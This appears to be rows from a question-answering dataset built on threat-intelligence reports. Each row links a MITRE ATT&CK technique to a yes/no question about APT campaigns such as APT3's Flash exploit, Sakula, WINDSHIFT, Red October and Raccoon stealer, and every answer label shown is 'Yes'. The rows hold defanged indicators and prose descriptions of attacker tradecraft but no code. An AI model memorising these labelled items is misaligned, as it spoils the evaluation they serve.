1350,272,272-Defense Evasion-T1211-Exploitation for Defense Evasion,"After the spear-phishing attack leveraging a malicious Adobe Flash exploit to gain initial access by exploiting CVE-2015-5119, is it likely that the Flash file ‘show.swf’ will attempt to execute shellcode for Defense Evasion before the shellcode installs the payload embedded in the GIF image?","Defense Evasion: The malicious Flash file 'show.swf' attempted to exploit the vulnerability and execute shellcode to install a payload, with the payload embedded in an animated GIF image, 'b.gif'. However, the payload was not weaponized as it lacked an encrypted payload, possibly due to UPS's tactic of serving payloads only within limited time windows and to specific victim profiles.","Initial Access: On July 8, 2015, Unit 42 identified a spear-phishing attack targeting the US Government, exploiting an Adobe Flash vulnerability (CVE-2015-5119) from the Hacking Team data breach. The attack involved a link to a Flash exploit hosted on rpt.perrydale[.]com and report.perrydale[.]com, both resolving to a Ukrainian IP 194.44.130.179, likely through DNS hijacking. The exploit, found at rpt.perrydale[.]com/en/show.swf and report.perrydale[.]com/ema/show.swf, retrieved a secondary payload, b.gif, from the same domains.
Execution: The Flash exploit, named 'show.swf', contained ActionScript designed to execute shellcode for installing a payload. The ActionScript classes involved were MainClass.as, MyClass.as, MyClass1.as, MyClass2.as, MyUtils.as, and ShellWin32.as. The 'TryExpl' function within MyClass.as created a use-after-free condition to exploit CVE-2015-5119. Shared functions with a previous UPS attack exploiting CVE-2015-3113 were also observed, including data type manipulation, logging, and decrypting shellcode.
Others: The attack shares similarities with a previous targeted attack attributed to the APT group known as UPS or APT3, using a Flash exploit leveraging CVE-2015-3113. The ActionScript classes and log messages in the malicious Flash files indicate attribution to UPS. The payload extraction and decryption technique from an animated GIF image was also used in the CVE-2015-3113 attacks. The shellcodes for CVE-2015-5119 and CVE-2015-3113 were found to be 99% similar. The attacks demonstrate how APT groups like UPS quickly leverage new vulnerabilities. SHA256 for the Flash exploit: a2fe113cc13acac2bb79a375f692b8ba5cc2fa880272adc7ab0d01f839e877ff. Domains involved: rpt.perrydale[.]com, report.perrydale[.]com, and IP 194.44.130.179.",Yes,apt.group.ups
1352,272,272-Execution-T1203-Exploitation for Client Execution,"After the spear-phishing attack exploits the Adobe Flash vulnerability through the links rpt.perrydale[.]com/en/show.swf and report.perrydale[.]com/ema/show.swf for initial access, is it likely that the Flash exploit 'show.swf' will execute shellcode using embedded ActionScript classes before attempting to evade defenses with a payload embedded in an animated GIF image 'b.gif'?","Execution: The Flash exploit, named 'show.swf', contained ActionScript designed to execute shellcode for installing a payload. The ActionScript classes involved were MainClass.as, MyClass.as, MyClass1.as, MyClass2.as, MyUtils.as, and ShellWin32.as. The 'TryExpl' function within MyClass.as created a use-after-free condition to exploit CVE-2015-5119. Shared functions with a previous UPS attack exploiting CVE-2015-3113 were also observed, including data type manipulation, logging, and decrypting shellcode.","Initial Access: On July 8, 2015, Unit 42 identified a spear-phishing attack targeting the US Government, exploiting an Adobe Flash vulnerability (CVE-2015-5119) from the Hacking Team data breach. The attack involved a link to a Flash exploit hosted on rpt.perrydale[.]com and report.perrydale[.]com, both resolving to a Ukrainian IP 194.44.130.179, likely through DNS hijacking. The exploit, found at rpt.perrydale[.]com/en/show.swf and report.perrydale[.]com/ema/show.swf, retrieved a secondary payload, b.gif, from the same domains.
Defense Evasion: The malicious Flash file 'show.swf' attempted to exploit the vulnerability and execute shellcode to install a payload, with the payload embedded in an animated GIF image, 'b.gif'. However, the payload was not weaponized as it lacked an encrypted payload, possibly due to UPS's tactic of serving payloads only within limited time windows and to specific victim profiles.
Others: The attack shares similarities with a previous targeted attack attributed to the APT group known as UPS or APT3, using a Flash exploit leveraging CVE-2015-3113. The ActionScript classes and log messages in the malicious Flash files indicate attribution to UPS. The payload extraction and decryption technique from an animated GIF image was also used in the CVE-2015-3113 attacks. The shellcodes for CVE-2015-5119 and CVE-2015-3113 were found to be 99% similar. The attacks demonstrate how APT groups like UPS quickly leverage new vulnerabilities. SHA256 for the Flash exploit: a2fe113cc13acac2bb79a375f692b8ba5cc2fa880272adc7ab0d01f839e877ff. Domains involved: rpt.perrydale[.]com, report.perrydale[.]com, and IP 194.44.130.179.",Yes,apt.group.ups
1356,273,273-Command and Control-T1071-Application Layer Protocol,"After the NewsBeef APT used improved JavaScript injection and obfuscation techniques for defense evasion, is it likely that the Pupy backdoor communicated with the command and control server using the obfs3 protocol for masking Tor communications?","Command and Control: The Pupy backdoor communicated with the command and control server using the obfs3 protocol, which is used to mask Tor communications. This indicates the attackers' understanding of its effectiveness against outbound connection monitoring.","Initial Access: The NewsBeef APT group, also known as APT33, engaged in spearphishing and watering hole attacks targeting Saudi Arabian entities. They used malicious macro-enabled Microsoft Office documents, PowerSploit, and the Pupy backdoor to gain initial access. The documents were delivered via email and social media/messaging applications, while compromised high-profile websites, including some belonging to the Saudi government, were injected with JavaScript to redirect visitors to attacker-controlled web servers.
Execution: The NewsBeef campaign utilized spearphishing with malicious Office documents to execute PowerShell scripts, which then downloaded poisoned installers for Flash, Citrix Client, and Chrome. These installers executed PowerSploit scripts to download and run the Pupy backdoor.
Defense Evasion: The NewsBeef APT improved their JavaScript injection and obfuscation techniques, which may have extended their server persistence and made it more difficult to identify the malicious JavaScript source on compromised sites.
Others: The NewsBeef APT group, identified as APT33, has historically used the Browser Exploitation Framework (BeEF) but shifted to a new toolset including macro-enabled Office documents, PowerSploit, and Pupy. They compromised a larger number of sites, including valuable Saudi government identities, and continued to rely on social engineering. The group's specific target set suggests that Saudi security teams should update their web applications and plugins to protect against this APT's activities. The group is expected to continue targeting Saudi Arabian organizations and may expand to other organizations connected to Saudi interests.",Yes,Twas the night before
1360,274,274-Command and Control-T1071-Application Layer Protocol,"After exploiting CVE-2015-5119 to execute a first stage downloader that retrieves the second stage PlugX file and successfully connects to several C2 domains starting with cdn[.]sanecat[.]com, is it likely that the Sakula malware will communicate with domains such as inocnation[.]com or oa[.]ameteksen[.]com as part of its command and control protocol?",Command and Control: The INOCNATION Campaign involved a new variant of Sakula malware that conducted C2 communications with the domain inocnation[.]com. The Ironman Campaign involved Sakula malware that communicated with a C2 IP address of 180.210.206.246. The French Aerospace Campaign involved Sakula connecting to a C2 domain of oa[.]ameteksen[.]com. The Sakula malware has been linked to the use of a number of zero-day exploits and high-profile incidents such as those resulting in healthcare and government data breach notifications earlier this year.,"Initial Access: In early July, CrowdStrike's Falcon Host technology detected an attack leveraging the CVE-2015-5119 exploit code that was publicly exposed after the breach of the European information security company Hacking Team. The exploit was hosted at www[.]cbppnews[.]com/movie.swf, which CrowdStrike speculates was meant to spoof the website of the US-based think tank ""Center on Budget and Policy Priorities"". Upon successful exploitation, a file was saved at ""%Temp%/Rdws.exe"" which is executed and writes another file at ""%TEMP%/adobe.dat."" This file was used as a first stage downloader to retrieve a second stage PlugX file that connected to several C2 domains beginning with cdn[.]sanecat[.]com. Analysis of this first stage downloader revealed it to be a new variant of Sakula malware.
Others: The Sakula malware variant has been linked to several significant targeted intrusion campaigns over the past 2-3 years, including the ""French Aerospace"" Campaign and the ""Ironman"" Campaign. CrowdStrike has observed limited use of what appears to be a third Sakula variant. Sakula is assessed as a limited-release tool in use by multiple adversaries. There is an apparent connection between the use of Sakula and PlugX, with evidence that Sakula and PlugX samples have relied on the same C2 infrastructure. The Sakula malware demonstrates the difficulty of attribution and the rationale for bookending technical information with analytic judgments. It is likely used by a small subset of operators, which, given the access to zero-day exploits and high-profile operations, are likely well-resourced.",Yes,sakula-reloaded
1363,275,275-Execution-T1204-User Execution,"After mimicking legitimate password recovery or reset emails in credential harvesting campaigns, is WINDSHIFT APT likely to use emails related to previous interactions to deliver malware via drive-by downloads or direct malware attachments before reusing command and control infrastructure from other groups?","Execution: PART III: WINDSHIFT APT   Phase 4: Hacking targets   Frequency: 1 or twice per year   - Use of emails related to previous interactions having links to drive-by downloads delivering malware or direct malware attachments, usually within an archive.  - Weaponization and reuse of malware from different threat actors.  - Reuse of command and control infrastructure from other groups.  - Separation between spear phishing infrastructure and malware C2 infrastructure to avoid attribution, suspicions, and takedowns.","Reconnaissance: PART III: WINDSHIFT APT   Phase 1: RECON   Duration: 1-2 years   - Fake personas on social platforms (LinkedIn, Facebook, Twitter, Instagram, Google Plus) to gather identifiable information, emails, phone numbers, friends contacts.  - Use of social media mobile apps to steal contact list, emails, and SMS contents.   Phase 2: RECON   Duration: 6 months   - Long term monitoring of targets via benign emails to understand click habits, subjects of interests, geo-locating targets, and email click rate.  - Use of mailing lists, sending daily emails duplicating content of local media to build content habit and relationship with the target.   - Tracking via Wasmyemailread[.]com and ifread[.]com.
Initial Access: PART III: WINDSHIFT APT   Phase 3: Credential harvesting   Duration: 1 day   - Sending emails mimicking legit password recovery or reset from Gmail, Apple iCloud, Etisalat, OWA outlook.  - SMS redirecting to credential harvesting pages.  - Domain typo squatting.  - Domains resolve only 1 day during the attack then shutdown.  - Anonymous domains registered with freenom.com for free: .ml, .tk, .ga. gq  - Use of HTTPS on credential harvesting landing pages with free SSL certificates from let's encrypt or COMODO.
Credential Access: PART III: WINDSHIFT APT   Phase 3: Credential harvesting   Duration: 1 day   - Sending emails mimicking legit password recovery or reset from Gmail, Apple iCloud, Etisalat, OWA outlook.  - SMS redirecting to credential harvesting pages.  - Domain typo squatting.  - Domains resolve only 1 day during the attack then shutdown.  - Anonymous domains registered with freenom.com for free: .ml, .tk, .ga. gq  - Use of HTTPS on credential harvesting landing pages with free SSL certificates from let's encrypt or COMODO.
Command and Control: PART III: WINDSHIFT APT   Phase 4: Hacking targets   Frequency: 1 or twice per year   - Use of emails related to previous interactions having links to drive-by downloads delivering malware or direct malware attachments, usually within an archive.  - Weaponization and reuse of malware from different threat actors.  - Reuse of command and control infrastructure from other groups.  - Separation between spear phishing infrastructure and malware C2 infrastructure to avoid attribution, suspicions, and takedowns.",Yes,In the Trails of WINDSHIFT APT
1364,275,275-Reconnaissance-T1589-Gather Victim Identity Information,"After attackers monitor targets via benign emails to understand their click habits and email click rates, is it likely that they will use social media mobile apps to steal identifiable information such as contact lists, emails, and SMS contents during their reconnaissance activities?","Reconnaissance: PART III: WINDSHIFT APT   Phase 1: RECON   Duration: 1-2 years   - Fake personas on social platforms (LinkedIn, Facebook, Twitter, Instagram, Google Plus) to gather identifiable information, emails, phone numbers, friends contacts.  - Use of social media mobile apps to steal contact list, emails, and SMS contents.   Phase 2: RECON   Duration: 6 months   - Long term monitoring of targets via benign emails to understand click habits, subjects of interests, geo-locating targets, and email click rate.  - Use of mailing lists, sending daily emails duplicating content of local media to build content habit and relationship with the target.   - Tracking via Wasmyemailread[.]com and ifread[.]com.","Initial Access: PART III: WINDSHIFT APT   Phase 3: Credential harvesting   Duration: 1 day   - Sending emails mimicking legit password recovery or reset from Gmail, Apple iCloud, Etisalat, OWA outlook.  - SMS redirecting to credential harvesting pages.  - Domain typo squatting.  - Domains resolve only 1 day during the attack then shutdown.  - Anonymous domains registered with freenom.com for free: .ml, .tk, .ga. gq  - Use of HTTPS on credential harvesting landing pages with free SSL certificates from let's encrypt or COMODO.
Execution: PART III: WINDSHIFT APT   Phase 4: Hacking targets   Frequency: 1 or twice per year   - Use of emails related to previous interactions having links to drive-by downloads delivering malware or direct malware attachments, usually within an archive.  - Weaponization and reuse of malware from different threat actors.  - Reuse of command and control infrastructure from other groups.  - Separation between spear phishing infrastructure and malware C2 infrastructure to avoid attribution, suspicions, and takedowns.
Credential Access: PART III: WINDSHIFT APT   Phase 3: Credential harvesting   Duration: 1 day   - Sending emails mimicking legit password recovery or reset from Gmail, Apple iCloud, Etisalat, OWA outlook.  - SMS redirecting to credential harvesting pages.  - Domain typo squatting.  - Domains resolve only 1 day during the attack then shutdown.  - Anonymous domains registered with freenom.com for free: .ml, .tk, .ga. gq  - Use of HTTPS on credential harvesting landing pages with free SSL certificates from let's encrypt or COMODO.
Command and Control: PART III: WINDSHIFT APT   Phase 4: Hacking targets   Frequency: 1 or twice per year   - Use of emails related to previous interactions having links to drive-by downloads delivering malware or direct malware attachments, usually within an archive.  - Weaponization and reuse of malware from different threat actors.  - Reuse of command and control infrastructure from other groups.  - Separation between spear phishing infrastructure and malware C2 infrastructure to avoid attribution, suspicions, and takedowns.",Yes,In the Trails of WINDSHIFT APT
1365,275,275-Reconnaissance-T1598-Phishing for Information,"After using fake social media personas to gather identifiable information and employing social media mobile apps to steal contact lists, emails, and SMS contents as part of reconnaissance, is it likely that WINDSHIFT APT will subsequently send benign daily emails duplicating local media content to build a relationship with the target and track interactions via domains like Wasmyemailread[.]com and ifread[.]com?","Reconnaissance: PART III: WINDSHIFT APT   Phase 1: RECON   Duration: 1-2 years   - Fake personas on social platforms (LinkedIn, Facebook, Twitter, Instagram, Google Plus) to gather identifiable information, emails, phone numbers, friends contacts.  - Use of social media mobile apps to steal contact list, emails, and SMS contents.   Phase 2: RECON   Duration: 6 months   - Long term monitoring of targets via benign emails to understand click habits, subjects of interests, geo-locating targets, and email click rate.  - Use of mailing lists, sending daily emails duplicating content of local media to build content habit and relationship with the target.   - Tracking via Wasmyemailread[.]com and ifread[.]com.","Initial Access: PART III: WINDSHIFT APT   Phase 3: Credential harvesting   Duration: 1 day   - Sending emails mimicking legit password recovery or reset from Gmail, Apple iCloud, Etisalat, OWA outlook.  - SMS redirecting to credential harvesting pages.  - Domain typo squatting.  - Domains resolve only 1 day during the attack then shutdown.  - Anonymous domains registered with freenom.com for free: .ml, .tk, .ga. gq  - Use of HTTPS on credential harvesting landing pages with free SSL certificates from let's encrypt or COMODO.
Execution: PART III: WINDSHIFT APT   Phase 4: Hacking targets   Frequency: 1 or twice per year   - Use of emails related to previous interactions having links to drive-by downloads delivering malware or direct malware attachments, usually within an archive.  - Weaponization and reuse of malware from different threat actors.  - Reuse of command and control infrastructure from other groups.  - Separation between spear phishing infrastructure and malware C2 infrastructure to avoid attribution, suspicions, and takedowns.
Credential Access: PART III: WINDSHIFT APT   Phase 3: Credential harvesting   Duration: 1 day   - Sending emails mimicking legit password recovery or reset from Gmail, Apple iCloud, Etisalat, OWA outlook.  - SMS redirecting to credential harvesting pages.  - Domain typo squatting.  - Domains resolve only 1 day during the attack then shutdown.  - Anonymous domains registered with freenom.com for free: .ml, .tk, .ga. gq  - Use of HTTPS on credential harvesting landing pages with free SSL certificates from let's encrypt or COMODO.
Command and Control: PART III: WINDSHIFT APT   Phase 4: Hacking targets   Frequency: 1 or twice per year   - Use of emails related to previous interactions having links to drive-by downloads delivering malware or direct malware attachments, usually within an archive.  - Weaponization and reuse of malware from different threat actors.  - Reuse of command and control infrastructure from other groups.  - Separation between spear phishing infrastructure and malware C2 infrastructure to avoid attribution, suspicions, and takedowns.",Yes,In the Trails of WINDSHIFT APT
1368,275,275-Command and Control-T1659-Content Injection,"After sending emails mimicking legitimate password recovery or reset messages to harvest credentials through domain typo-squatting and HTTPS landing pages, is WINDSHIFT APT likely to utilize emails from previous interactions to deliver malware through drive-by downloads or direct attachments as part of their command and control efforts?","Command and Control: PART III: WINDSHIFT APT   Phase 4: Hacking targets   Frequency: 1 or twice per year   - Use of emails related to previous interactions having links to drive-by downloads delivering malware or direct malware attachments, usually within an archive.  - Weaponization and reuse of malware from different threat actors.  - Reuse of command and control infrastructure from other groups.  - Separation between spear phishing infrastructure and malware C2 infrastructure to avoid attribution, suspicions, and takedowns.","Reconnaissance: PART III: WINDSHIFT APT   Phase 1: RECON   Duration: 1-2 years   - Fake personas on social platforms (LinkedIn, Facebook, Twitter, Instagram, Google Plus) to gather identifiable information, emails, phone numbers, friends contacts.  - Use of social media mobile apps to steal contact list, emails, and SMS contents.   Phase 2: RECON   Duration: 6 months   - Long term monitoring of targets via benign emails to understand click habits, subjects of interests, geo-locating targets, and email click rate.  - Use of mailing lists, sending daily emails duplicating content of local media to build content habit and relationship with the target.   - Tracking via Wasmyemailread[.]com and ifread[.]com.
Initial Access: PART III: WINDSHIFT APT   Phase 3: Credential harvesting   Duration: 1 day   - Sending emails mimicking legit password recovery or reset from Gmail, Apple iCloud, Etisalat, OWA outlook.  - SMS redirecting to credential harvesting pages.  - Domain typo squatting.  - Domains resolve only 1 day during the attack then shutdown.  - Anonymous domains registered with freenom.com for free: .ml, .tk, .ga. gq  - Use of HTTPS on credential harvesting landing pages with free SSL certificates from let's encrypt or COMODO.
Execution: PART III: WINDSHIFT APT   Phase 4: Hacking targets   Frequency: 1 or twice per year   - Use of emails related to previous interactions having links to drive-by downloads delivering malware or direct malware attachments, usually within an archive.  - Weaponization and reuse of malware from different threat actors.  - Reuse of command and control infrastructure from other groups.  - Separation between spear phishing infrastructure and malware C2 infrastructure to avoid attribution, suspicions, and takedowns.
Credential Access: PART III: WINDSHIFT APT   Phase 3: Credential harvesting   Duration: 1 day   - Sending emails mimicking legit password recovery or reset from Gmail, Apple iCloud, Etisalat, OWA outlook.  - SMS redirecting to credential harvesting pages.  - Domain typo squatting.  - Domains resolve only 1 day during the attack then shutdown.  - Anonymous domains registered with freenom.com for free: .ml, .tk, .ga. gq  - Use of HTTPS on credential harvesting landing pages with free SSL certificates from let's encrypt or COMODO.",Yes,In the Trails of WINDSHIFT APT
1374,276,276-Reconnaissance-T1595-Active Scanning,"Following the initial infiltration stage, is it likely that the 'Recon' module group will collect initial system information, such as browser history and cached credentials, before the 'Wnhttp' module checks Internet connectivity and obtains the external IP address of the targeted system?","Reconnaissance: The CTI report details the 'Recon' module group, which is designed for use during the first stage of a cyberattack following initial infiltration. Its primary function is to collect general information about the target system, helping to locate and identify the infected machine, estimate the potential value of the computer's data, and determine which other modules should be deployed next. Additionally, these modules collect initial, easy-to-get information such as browser history, browser cached credentials, and FTP client settings.  The 'RegConn' module within this group gathers system-related information, including installed and recently run software, application launch timestamps, attached USB devices, and software from these devices. It also checks for the presence of custom enterprise software and maintains download+execute functionality, sending encrypted data to C&C servers like 'nt-windows-online.com'.  The 'Wnhttp' module is a plugin that checks Internet connectivity and obtains the external IP address of the current system using public services such as '2ip.ru', 'myip.ru', and 'smart-ip.net'. It collects basic system information, creates a unique identifier based on the VolumeSerialNumber or a hash of the computer name and Internet Explorer's ProductID, and submits this data to the C&C server.  The 'Sysinfo' module is a PE DLL that collects a range of information about the computer, including browser history, and sends this data to the C&C server after compression and encryption.","Persistence: The 'Persistence' module group contains installer and payload code to plant a plugin in popular applications such as MS Office or Adobe Reader. The backdoor code is activated when a specially crafted document is opened on the target machine. This is used to regain lost access to a machine in case of unexpected loss of control, such as C&C server takedown or local malware cleaning.
Credential Access: The 'Password' module group is designed to steal credentials from various applications and resources, ranging from Mail.ru Agent to MS Outlook credentials and Windows account hashes, including cached Windows Domain account hashes. It is capable of using low-level and direct disk access to copy protected files.
Lateral Movement: The 'Spreading' module group is used to scan for other hosts on the network, fingerprint them, and then infect them via MS08-067 or a list of stolen admin credentials. A module from this group can dump Cisco network router configuration via SNMP commands and an embedded TFTP server.
Exfiltration: The 'Exfiltration' module group transfers all collected data to the C&C server. Modules in this group can reach FTP servers, remote network shares, and local disk drives to copy files from these resources. Unlike the 'Recon' data collection modules, these modules are designed to run repeatedly and bring only new valuable data.
Others: The CTI report mentions a 'Mobile' module group used to dump all valuable information from locally attached mobile devices. It can copy contact information, calendars, SMS, and emails databases, and other private data. These modules can check if a device has been jailbroken.  The report also references a 'USBInfection' group, which copies data files related to the current malware family from USB drives. However, there is no module observed to infect USB drives. It is suspected that such a module exists, capable of infecting removable storage, running arbitrary modules from other groups, and saving data back to the USB drives.",Yes,securelist.com-Red October Detailed Malware Description 2 Second Stage of Attack
1377,276,276-Credential Access-T1555-Credentials from Password Stores,"After deploying the 'Recon' module group to gather initial system information and determine subsequent actions, is it likely that the 'Password' module group will be used to steal credentials from various applications and resources before the 'Spreading' module group attempts to infect other hosts on the network via MS08-067 or stolen admin credentials?","Credential Access: The 'Password' module group is designed to steal credentials from various applications and resources, ranging from Mail.ru Agent to MS Outlook credentials and Windows account hashes, including cached Windows Domain account hashes. It is capable of using low-level and direct disk access to copy protected files.","Reconnaissance: The CTI report details the 'Recon' module group, which is designed for use during the first stage of a cyberattack following initial infiltration. Its primary function is to collect general information about the target system, helping to locate and identify the infected machine, estimate the potential value of the computer's data, and determine which other modules should be deployed next. Additionally, these modules collect initial, easy-to-get information such as browser history, browser cached credentials, and FTP client settings.  The 'RegConn' module within this group gathers system-related information, including installed and recently run software, application launch timestamps, attached USB devices, and software from these devices. It also checks for the presence of custom enterprise software and maintains download+execute functionality, sending encrypted data to C&C servers like 'nt-windows-online.com'.  The 'Wnhttp' module is a plugin that checks Internet connectivity and obtains the external IP address of the current system using public services such as '2ip.ru', 'myip.ru', and 'smart-ip.net'. It collects basic system information, creates a unique identifier based on the VolumeSerialNumber or a hash of the computer name and Internet Explorer's ProductID, and submits this data to the C&C server.  The 'Sysinfo' module is a PE DLL that collects a range of information about the computer, including browser history, and sends this data to the C&C server after compression and encryption.
Persistence: The 'Persistence' module group contains installer and payload code to plant a plugin in popular applications such as MS Office or Adobe Reader. The backdoor code is activated when a specially crafted document is opened on the target machine. This is used to regain lost access to a machine in case of unexpected loss of control, such as C&C server takedown or local malware cleaning.
Lateral Movement: The 'Spreading' module group is used to scan for other hosts on the network, fingerprint them, and then infect them via MS08-067 or a list of stolen admin credentials. A module from this group can dump Cisco network router configuration via SNMP commands and an embedded TFTP server.
Exfiltration: The 'Exfiltration' module group transfers all collected data to the C&C server. Modules in this group can reach FTP servers, remote network shares, and local disk drives to copy files from these resources. Unlike the 'Recon' data collection modules, these modules are designed to run repeatedly and bring only new valuable data.
Others: The CTI report mentions a 'Mobile' module group used to dump all valuable information from locally attached mobile devices. It can copy contact information, calendars, SMS, and emails databases, and other private data. These modules can check if a device has been jailbroken.  The report also references a 'USBInfection' group, which copies data files related to the current malware family from USB drives. However, there is no module observed to infect USB drives. It is suspected that such a module exists, capable of infecting removable storage, running arbitrary modules from other groups, and saving data back to the USB drives.",Yes,securelist.com-Red October Detailed Malware Description 2 Second Stage of Attack
1383,277,277-Discovery-T1046-Network Service Discovery,"After identifying potential entry points into medical infrastructure using tools like masscan, Shodan, and Censys during reconnaissance, is it likely that various services on medical network perimeters, including outdated systems and medical devices, will be discovered as part of network service discovery?","Discovery: The report discusses the discovery of various services on medical network perimeters, including outdated Building Management systems and printers with unprotected web interfaces. It also notes the presence of medical devices like spirometers or blood pressure monitors that support MQTT protocol and are discoverable online, indicating a potential for unauthorized access and control.","Reconnaissance: The CTI report by Denis Makrushin and Yury Namestnikov, dated March 13, 2018, details the reconnaissance efforts of cybercriminals targeting medical networks. The authors describe the use of masscan to identify potential entry points into medical infrastructure by extracting IP ranges associated with medical-related keywords. They also mention the use of specialized search engines like Shodan and Censys to find publicly available resources of these organizations. The report highlights the discovery of non-trivial ports and services, such as Building Management systems using the Niagara Fox protocol and printers with web interfaces without authentication, which could be exploited for further reconnaissance.
Others: The report provides an overview of the threats affecting medical networks, with statistics showing that over 60% of medical organizations had malware on their servers or computers in 2017. It also discusses the targeting of pharmaceutical organizations by APT actors using malware like PlugX and Cobalt Strike to exfiltrate data, suggesting an interest in intellectual property or business plans. The authors recommend removing medical data nodes from public access, updating software, and avoiding connecting expensive equipment to the main LAN as measures to mitigate these threats.",Yes,therapeutic_postmortem_of_connected_medicine
1384,277,277-Discovery-T1518-Software Discovery,"After using tools such as masscan and search engines like Shodan and Censys to identify potential entry points into medical networks during reconnaissance, is it likely that the cybercriminals discovered outdated Building Management systems and medical devices supporting the MQTT protocol on the medical network perimeter?","Discovery: The report discusses the discovery of various services on medical network perimeters, including outdated Building Management systems and printers with unprotected web interfaces. It also notes the presence of medical devices like spirometers or blood pressure monitors that support MQTT protocol and are discoverable online, indicating a potential for unauthorized access and control.","Reconnaissance: The CTI report by Denis Makrushin and Yury Namestnikov, dated March 13, 2018, details the reconnaissance efforts of cybercriminals targeting medical networks. The authors describe the use of masscan to identify potential entry points into medical infrastructure by extracting IP ranges associated with medical-related keywords. They also mention the use of specialized search engines like Shodan and Censys to find publicly available resources of these organizations. The report highlights the discovery of non-trivial ports and services, such as Building Management systems using the Niagara Fox protocol and printers with web interfaces without authentication, which could be exploited for further reconnaissance.
Others: The report provides an overview of the threats affecting medical networks, with statistics showing that over 60% of medical organizations had malware on their servers or computers in 2017. It also discusses the targeting of pharmaceutical organizations by APT actors using malware like PlugX and Cobalt Strike to exfiltrate data, suggesting an interest in intellectual property or business plans. The authors recommend removing medical data nodes from public access, updating software, and avoiding connecting expensive equipment to the main LAN as measures to mitigate these threats.",Yes,therapeutic_postmortem_of_connected_medicine
1385,277,277-Discovery-T1120-Peripheral Device Discovery,"After conducting reconnaissance on medical infrastructure using tools like masscan and identifying Building Management systems with Niagara Fox protocol and unauthenticated printer web interfaces, is it likely that outdated medical devices supporting the MQTT protocol and discoverable online will be identified during the discovery phase?","Discovery: The report discusses the discovery of various services on medical network perimeters, including outdated Building Management systems and printers with unprotected web interfaces. It also notes the presence of medical devices like spirometers or blood pressure monitors that support MQTT protocol and are discoverable online, indicating a potential for unauthorized access and control.","Reconnaissance: The CTI report by Denis Makrushin and Yury Namestnikov, dated March 13, 2018, details the reconnaissance efforts of cybercriminals targeting medical networks. The authors describe the use of masscan to identify potential entry points into medical infrastructure by extracting IP ranges associated with medical-related keywords. They also mention the use of specialized search engines like Shodan and Censys to find publicly available resources of these organizations. The report highlights the discovery of non-trivial ports and services, such as Building Management systems using the Niagara Fox protocol and printers with web interfaces without authentication, which could be exploited for further reconnaissance.
Others: The report provides an overview of the threats affecting medical networks, with statistics showing that over 60% of medical organizations had malware on their servers or computers in 2017. It also discusses the targeting of pharmaceutical organizations by APT actors using malware like PlugX and Cobalt Strike to exfiltrate data, suggesting an interest in intellectual property or business plans. The authors recommend removing medical data nodes from public access, updating software, and avoiding connecting expensive equipment to the main LAN as measures to mitigate these threats.",Yes,therapeutic_postmortem_of_connected_medicine
1388,278,278-Defense Evasion-T1205-Traffic Signaling,"After collecting system and account information as well as crypto wallet data through the Execution phase, is it likely that Raccoon stealer will make network requests to a Telegram channel to receive encrypted addresses of C&C servers for bypassing blocking and ensuring Defense Evasion before communicating with these C&C servers using Telegram features in the Command and Control phase?","Defense Evasion: The attackers used obfuscation techniques such as aaencode algorithm to hide the JS-sniffer's code. They also used loaders like Buer and Smoke to download payloads. The Raccoon stealer made network requests to a Telegram channel to receive the encrypted address of a new C&C server, bypassing blocking.","Initial Access: In the summer of 2020, Group-IB specialists discovered a malware distribution campaign exploiting Telegram's legitimate features to distribute Raccoon stealer. Attackers used Telegram channels to bypass blocking of active C&C servers. The campaign involved phishing pages created with the Mephistophilus phishing kit and mailings with attachments containing malicious macros.
Execution: The Raccoon stealer, once executed, collects system information, account data, bank card data, and autofill form details from browsers. It also scans for valid crypto wallets and gains access to configuration files. The Vidar stealer, another malware used in the campaign, collects data from browsers, bank card data, crypto wallet files, messages, and more.
Command and Control: The Raccoon stealer communicated with C&C servers using legitimate features of Telegram to avoid detection. The C&C servers were encrypted and distributed through the Telegram channel 'blintick'.
Others: The campaign was divided into four stages based on the tools used: First wave (February 19 to March 5, 2020), Second wave (March 13 to May 22, 2020), Third wave (June 29 to July 2, 2020), and Fourth wave (August 24 to September 12, 2020). Most domains related to the campaign were registered with two registrars: Cloud2m and Host Africa. The attackers also distributed samples of another stealer called Vidar using malicious macros and phishing pages. The domains used to store the code and collect stolen bank card data were registered during the second wave with the same registrars as the domains discovered while investigating the malicious campaign. The attackers experimented with various loaders, including Buer and Smoke loaders. The campaign's purpose was to steal payment and user data.",Yes,The footprints of Raccoon_ a story about operators of JS-sniffer FakeSecurity distributing Raccoon stealer
1389,278,278-Command and Control-T1102-Web Service,"After using obfuscation techniques like the aaencode algorithm to evade defenses and downloading payloads with loaders such as Buer and Smoke, is it likely that the Raccoon stealer will communicate with C&C servers using Telegram to evade detection?",Command and Control: The Raccoon stealer communicated with C&C servers using legitimate features of Telegram to avoid detection. The C&C servers were encrypted and distributed through the Telegram channel 'blintick'.,"Initial Access: In the summer of 2020, Group-IB specialists discovered a malware distribution campaign exploiting Telegram's legitimate features to distribute Raccoon stealer. Attackers used Telegram channels to bypass blocking of active C&C servers. The campaign involved phishing pages created with the Mephistophilus phishing kit and mailings with attachments containing malicious macros.
Execution: The Raccoon stealer, once executed, collects system information, account data, bank card data, and autofill form details from browsers. It also scans for valid crypto wallets and gains access to configuration files. The Vidar stealer, another malware used in the campaign, collects data from browsers, bank card data, crypto wallet files, messages, and more.
Defense Evasion: The attackers used obfuscation techniques such as aaencode algorithm to hide the JS-sniffer's code. They also used loaders like Buer and Smoke to download payloads. The Raccoon stealer made network requests to a Telegram channel to receive the encrypted address of a new C&C server, bypassing blocking.
Others: The campaign was divided into four stages based on the tools used: First wave (February 19 to March 5, 2020), Second wave (March 13 to May 22, 2020), Third wave (June 29 to July 2, 2020), and Fourth wave (August 24 to September 12, 2020). Most domains related to the campaign were registered with two registrars: Cloud2m and Host Africa. The attackers also distributed samples of another stealer called Vidar using malicious macros and phishing pages. The domains used to store the code and collect stolen bank card data were registered during the second wave with the same registrars as the domains discovered while investigating the malicious campaign. The attackers experimented with various loaders, including Buer and Smoke loaders. The campaign's purpose was to steal payment and user data.",Yes,The footprints of Raccoon_ a story about operators of JS-sniffer FakeSecurity distributing Raccoon stealer
1390,279,279-Persistence-T1137-Office Application Startup,"After gaining initial access via phishing emails with executable attachments and subsequently executing the SBDH malware to download its backdoor and data stealer components, is it likely that the malware will employ a persistence technique to replace the handler for Word documents before using various communication methods to evade detection while interacting with its C&C server?","Persistence: The SBDH malware employs a unique persistence technique by replacing the handler for Word documents, ensuring that the malware is executed whenever a Word document is opened or edited on the infected system.","Initial Access: The SBDH toolkit, identified by ESET, was distributed via phishing emails with executable attachments that had double extensions, relying on Windows' default behavior of hiding extensions. The executables used legitimate-looking icons of Microsoft applications or Word documents to increase the likelihood of execution by the recipient.
